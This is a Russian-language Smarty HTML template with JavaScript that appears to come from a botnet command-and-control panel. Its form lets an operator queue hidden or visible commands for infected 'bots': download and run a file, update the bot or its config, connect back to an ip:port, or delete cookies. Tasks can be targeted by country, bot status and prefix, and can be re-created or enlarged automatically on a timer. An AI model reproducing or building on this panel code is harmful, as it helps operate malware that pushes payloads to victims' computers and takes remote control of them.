<form action="/admins/cmd_create_cmd.html?window=1&amp;id={$admin->id}" enctype="application/x-www-form-urlencoded" method="post" name="add_sub{$rand_name}" id="add_sub{$rand_name}" onsubmit="submit_{$rand_name}(); return false;">
{if $smarty.post.submit eq ''}
<table cellspacing="1" cellpadding="0" class="t" style="width:100%">
<tr class="bg1">
		<td style="width:30%">Видимость:</td>
		<td style="width:70%">
        <select name="dev" class="i1" onFocus="this.id = 'i1'" onBlur="this.id = ''" style="width: 100%">
        <option value="1" selected="selected">Скрытая комманда</option>
        <option value="0">Видимая комманда (Не скрытая)</option>
        </select>
        </td>
</tr>
<tr class="bg2"><td colspan="2">&nbsp;</td></tr>
<tr class="bg1">
		<td style="width:30%">Тип комманды:</td>
		<td style="width:70%">
        <select name="type" id="type{$rand_name}" class="user" style="width:90%">
        <option value="download">Скачать и запустить файл</option>
        <option value="update">Обновление</option>
        <option value="sb">sb ip:port</option>
        <option value="bc">bc ip:port</option>
        <option value="updateconfig">Обновить конфиг</option>
        <option value="deletecookies">Удалить куки</option>
    </select><input type="button" class="user" style="width:10%" value="..." onclick="user_cmd('{$rand_name}');" />
        </td>
</tr>
<tr class="bg2"><td colspan="2">&nbsp;</td></tr>
<tr class="bg1">
		<td style="width:30%">Страна:</td>
		<td style="width:70%">
        <select name="country[]" class="i1" onFocus="this.id = 'i1'" onBlur="this.id = ''" style="width: 100%; min-height: 100px" multiple="multiple">
        <option value="*" selected="selected">Все</option>
        {foreach from=$data->c item=c}<option value="{$c->code}">{$country_code[$c->code]}</option>{/foreach}
        </select>
        </td>
</tr>
<tr class="bg2"><td colspan="2">&nbsp;</td></tr>
<tr class="bg1">
		<td style="width:30%">Статус:</td>
		<td style="width:70%"><select name="status" class="user" style="width:100%"><option value="3">Новый бот</option><option value="2">Зарегистрированный бот</option><option value="1" selected="selected">Всем</option></select></td>
</tr>
<tr class="bg2"><td colspan="2">&nbsp;</td></tr>
<tr class="bg1">
		<td style="width:30%">Ограничение по количеству:</td>
		<td style="width:70%">
        <input name="limit" type="text" class="i1" onFocus="this.id = 'i1'" onBlur="this.id = ''" style="width: 99%;" onkeypress="return numbersonly(event)">
        </td>
</tr>
<tr class="bg2"><td colspan="2">&nbsp;</td></tr>
<tr class="bg1">
		<td style="width:30%" title="После выполнения данного задания не давать команды боту, который его получил до удаления данного задания из системы.">Ограничиваться данным заданием:</td>
		<td style="width:70%">
        <select name="limit_task" class="user" style="width:100%"><option value="2">Да</option><option value="1" selected="selected">Нет</option> </select>
        </td>
</tr>
<tr class="bg2"><td colspan="2">&nbsp;</td></tr>
<tr class="bg1">
		<td>Префикс:</td>
		<td>
        <select name="prefix[]" style="width: 100%; min-height: 100px" class="i1" onFocus="this.id = 'i1'" onBlur="this.id = ''" multiple="multiple">
        <option value="*" selected="selected">Всем</option>
        {foreach from=$data->p item=p}<option value="{$p->prefix}">{$p->prefix} ({$p->count})</option>{/foreach}
        </select>
        </td>
</tr>
<tr class="bg2"><td colspan="2">&nbsp;</td></tr>
<tr class="bg1">
		<td style="width:30%">Ссылка: <font style="font-size: 9px;">(максимально 220 символов)</font></td>		<td style="width:70%; vertical-align: middle"><input name="link" type="text" class="i1" onFocus="this.id = 'i1'" onBlur="this.id = ''" style="width: 99%;" maxlength="220"></td>
</tr>
<tr class="bg2"><td colspan="2">&nbsp;</td></tr>
</table>
<input type="hidden" name="submit" value="1">
<table cellspacing="1" cellpadding="0" class="t" style="width:100%">
<tr class="bg2"><td colspan="2">&nbsp;</td></tr>
<tr class="bg1">
		<td style="width:30%">Автоматическое пересоздание/увеличение задания:</td>
		<td style="width:70%">
        <select name="sleep" style="width: 100%; " class="i1" onFocus="this.id = 'i1'" onBlur="this.id = ''">
        <option value="0" selected="selected">Отключить</option>
        <option value="600">Каждые 10 минут</option>
        <option value="1200">Каждые 20 минут</option>
        <option value="1800">Каждые 30 минут</option>
        <option value="2400">Каждые 40 минут</option>
        <option value="3000">Каждые 50 минут</option>
        <option value="3600">Каждые 60 минут</option>
        <option value="7200">Каждые 120 минут</option>
        </select>
        </td>
</tr>
<tr class="bg2"><td colspan="2">&nbsp;</td></tr>
<tr class="bg1">
		<td>Автоматическое увеличение<br />ограничение по количеству:</td>
		<td>
        <select name="increase" style="width: 100%;" class="i1" onFocus="this.id = 'i1'" onBlur="this.id = ''">
        <option value="0" selected="selected">Отключить</option>
        <option value="+100">Округлить (Колличесво+100)</option>
        <option value="+500" >Округлить (Колличесво+500)</option>
        <option value="+1000">Округлить (Колличесво+1000)</option>
        <option value="*1.5">Округлить (Колличесво*1.5)</option>
        <option value="*2.0">Округлить (Колличесво*2.0)</option>
        <option value="*2.5">Округлить (Колличесво*2.5)</option>
        <option value="*3.0">Округлить (Колличесво*3.0)</option>
        </select>
        </td>
</tr>
<tr class="bg2"><td colspan="2">&nbsp;</td></tr>
<tr class="bg2"><td colspan="2" style="font-size:12px">Если включить "Автоматическое увеличение ограничение по количеству" то задание не будет пересоздаваться, а будет увеличение, а если увеличение отключить, то задание будет пересоздаваться!</td></tr>
<tr class="bg2"><td colspan="2">&nbsp;</td></tr>
</table>
<div class=t>
<input class=i4 type="button" name="submit" value="Готово" style="width:100%;" onclick="submit_{$rand_name}();">
</div>
{else}
<div align="center">Пыпытка добавить комманду, завершена.</div>
<script language="javascript" type="application/javascript">
//window_close_opacity(document.forms['add_sub{$rand_name}'].parentNode.id.replace('_content', '_wid'), 1);
</script>
{/if}
</form>

<script language="javascript" type="application/javascript">
var id_{$rand_name} = document.forms['add_sub{$rand_name}'].parentNode.id.replace('_content', '');
document.getElementById(id_{$rand_name} + '_title').innerHTML = 'Создание команды - {$admin->link}';

function submit_{$rand_name}(){ldelim}
hax(document.forms['add_sub{$rand_name}'].action,
	{ldelim}
		method: document.forms['add_sub{$rand_name}'].method,
		form: 'add_sub{$rand_name}',
		id: id_{$rand_name} + '_content',
		nohistory:true,
		nocache:true,
		destroy:true,
		rc:true
	{rdelim}
);
//document.getElementById(id_{$rand_name} + '_content').innerHTML = '<br /><div align="center"><img src="/images/indicator.gif" title="Загрузка" alt="Загрузка" /></div>';
{rdelim}
</script>